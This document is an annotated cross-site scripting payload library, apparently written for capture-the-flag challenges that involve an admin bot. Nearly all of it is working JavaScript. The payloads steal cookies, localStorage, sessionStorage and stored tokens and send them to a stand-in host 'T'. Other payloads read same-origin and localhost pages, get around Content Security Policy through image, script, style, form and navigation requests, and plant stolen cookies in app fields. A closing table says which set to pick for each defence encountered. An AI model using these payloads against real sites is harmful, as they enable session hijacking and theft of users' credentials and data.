# Payload variants deep — the payload library, annotated

## The canary set

Each canary proves one property — run them in order:

```javascript
// execution — the cheapest proof JS runs
console.log('HIT '+Math.random());
// DOM write — proves the payload can touch the tree
document.title='CANARY';
document.body.setAttribute('data-canary','1');
// a marker element — proves DOM insertion
document.body.innerHTML+='<div id="c">x</div>';
// network — proves egress works
fetch('https://TUNNEL/canary');
new Image().src='https://TUNNEL/c.png';
// context — proves WHERE the payload landed
console.log(location.href, self===top?'top':'frame', document.origin);
```

## The context-dump payload

Run before the real payload — dumps the environment it lands in:

```javascript
return {
  url: location.href,
  origin: location.origin,
  inIframe: window.self !== window.top,
  cookie: document.cookie,
  localStorage: Object.keys(localStorage),
  sessionStorage: Object.keys(sessionStorage),
  ua: navigator.userAgent,
  webdriver: navigator.webdriver,
  referrer: document.referrer,
};
```

The `inIframe` and `cookie` reads are the two that most often change
the payload design — a frame context and a cookie-less origin both
redirect the approach.

## The credential exfil set

```javascript
// the flag is the cookie
fetch('https://T/?c='+encodeURIComponent(document.cookie));
// HttpOnly cookie — exfil what a same-origin request carries
fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://T/?d='+btoa(t)));
// a named cookie only
var c=document.cookie.match(/flag=([^;]+)/);if(c)fetch('https://T/?c='+c[1]);
// localStorage / sessionStorage
fetch('https://T/?ls='+encodeURIComponent(JSON.stringify(localStorage)));
fetch('https://T/?ss='+encodeURIComponent(JSON.stringify(sessionStorage)));
// a specific stored token
fetch('https://T/?t='+encodeURIComponent(localStorage.token||sessionStorage.jwt));
```

## The same-origin-read + exfil set

The flag lives on a page the bot's origin can fetch — read it, then
exfil:

```javascript
// read a flag page, exfil its text
fetch('/flag').then(r=>r.text()).then(t=>fetch('https://T/?f='+btoa(t)));
// read an admin page, extract the flag pattern
fetch('/admin').then(r=>r.text()).then(t=>{
  var m=t.match(/flag\{[^}]+\}/i);
  if(m)fetch('https://T/?f='+encodeURIComponent(m[0]));
});
// read an internal API the bot's origin reaches
fetch('http://localhost:8080/internal/flag').then(r=>r.text()).then(t=>fetch('https://T/?f='+btoa(t)));
// chain: read the flag page's DOM element
fetch('/profile').then(r=>r.text()).then(t=>{
  var d=new DOMParser().parseFromString(t,'text/html');
  fetch('https://T/?f='+encodeURIComponent(d.querySelector('#flag').textContent));
});
```

## The egress-blocked write-back set

When off-origin is blocked — stash the flag on the app's own origin:

```javascript
// write to a profile/bio field you can read
fetch('/api/profile',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({bio:document.cookie})});
// store in a note/comment
fetch('/api/notes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'note='+encodeURIComponent(document.cookie)});
// put it in a setting you can query
fetch('/api/settings',{method:'POST',body:'x='+document.cookie});
// store in a same-origin page you navigate to
fetch('/api/messages',{method:'POST',body:'m='+btoa(document.cookie)});
```

The flag never leaves the origin — your read is a normal same-origin
request after the bot's write lands.

## The CSP-loose subresource set

`connect-src` blocks `fetch`; `img-src`/`script-src`/`style-src`/
`form-action` are separate and often looser:

```javascript
// img-src
new Image().src='https://T/i.png?c='+encodeURIComponent(document.cookie);
// script-src
var s=document.createElement('script');s.src='https://T/j.js?c='+encodeURIComponent(document.cookie);document.body.append(s);
// style-src
var l=document.createElement('link');l.rel='stylesheet';l.href='https://T/s.css?c='+document.cookie;document.head.append(l);
// form-action — full page submit
var f=document.createElement('form');f.action='https://T/';f.method='POST';
var i=document.createElement('input');i.name='c';i.value=document.cookie;
f.append(i);document.body.append(f);f.submit();
// navigation — no CSP directive blocks it
top.location='https://T/?c='+encodeURIComponent(document.cookie);
window.open('https://T/?c='+document.cookie);
```

## The fire-and-forget set

For a short wait — no round-trip needed:

```javascript
// sendBeacon — survives navigation, no await
navigator.sendBeacon('https://T/?c='+encodeURIComponent(document.cookie));
// Image — no await needed
new Image().src='https://T/i.png?c='+document.cookie;
// a link preload — fire and forget
var a=document.createElement('a');a.href='https://T/?c='+document.cookie;a.click();
```

## The encoding set

The exfil dies at the encoding as often as the fetch:

```javascript
// encodeURIComponent — for query params
fetch('https://T/?d='+encodeURIComponent(the_value));
// btoa — for arbitrary text
fetch('https://T/?d='+btoa(the_value));
// chunked — for a long value
the_value.match(/.{1,50}/g).forEach((c,i)=>fetch('https://T/?'+i+'='+encodeURIComponent(c)));
// hex — when btoa is unavailable
fetch('https://T/?d='+[...the_value].map(c=>c.charCodeAt(0).toString(16)).join(''));
```

## The frame/top set

```javascript
// navigate the top frame — exfil via navigation
top.location='https://T/?c='+document.cookie;
// postMessage to a frame you control
top.postMessage(document.cookie,'*');
// open a window
window.open('https://T/?c='+document.cookie);
```

## The WebDriver `execute` read set

```javascript
return document.cookie;
return JSON.stringify(localStorage);
return JSON.stringify(sessionStorage);
return fetch('/flag').then(r=>r.text());
return fetch('file:///flag').then(r=>r.text());
return document.querySelector('#flag').textContent;
return new Promise(d=>{var x=new XMLHttpRequest();x.open('GET','file:///flag');x.onload=()=>d(x.responseText);x.send();});
```

## The selection logic

| Constraint | Set |
|---|---|
| proving exec | canary |
| unknown context | context dump |
| flag is cookie | credential exfil |
| cookie HttpOnly | same-origin ride / jar |
| flag is a same-origin page | same-origin read + exfil |
| egress blocked | write-back |
| CSP blocks fetch | subresource |
| short wait | fire-and-forget |
| encoding issues | encoding set |
| frame context | frame/top set |
| need the browser's own read | `execute` set |
